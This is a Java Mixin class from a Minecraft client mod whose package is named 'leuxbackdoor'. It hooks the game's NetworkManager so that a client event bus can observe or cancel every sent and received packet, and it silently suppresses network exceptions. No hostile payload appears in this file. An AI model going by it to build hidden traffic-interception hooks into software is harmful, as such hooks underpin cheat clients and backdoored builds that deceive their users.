package me.accessmodifier364.leuxbackdoor.client.mixins;

import io.netty.channel.ChannelHandlerContext;
import me.accessmodifier364.leuxbackdoor.client.event.EventClientBus;
import me.accessmodifier364.leuxbackdoor.client.event.events.EventPacket;
import net.minecraft.network.NetworkManager;
import net.minecraft.network.Packet;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

// External.


@Mixin(value = NetworkManager.class)
public class MixinNetworkManager {
    // Receive packet.
    @Inject(method = "channelRead0", at = @At("HEAD"), cancellable = true)
    private void receive(ChannelHandlerContext context, Packet<?> packet, CallbackInfo callback) {
        EventPacket event_packet = new EventPacket.ReceivePacket(packet);

        EventClientBus.EVENT_BUS.post(event_packet);

        if (event_packet.isCancelled()) {
            callback.cancel();
        }
    }

    // Send packet.
    @Inject(method = "sendPacket(Lnet/minecraft/network/Packet;)V", at = @At("HEAD"), cancellable = true)
    private void send(Packet<?> packet, CallbackInfo callback) {
        EventPacket event_packet = new EventPacket.SendPacket(packet);

        EventClientBus.EVENT_BUS.post(event_packet);

        if (event_packet.isCancelled()) {
            callback.cancel();
        }
    }

    // Exception packet.
    @Inject(method = "exceptionCaught", at = @At("HEAD"), cancellable = true)
    private void exception(ChannelHandlerContext exc, Throwable exc_, CallbackInfo callback) {
        if (exc_ instanceof Exception) {
            callback.cancel();
        }
    }
}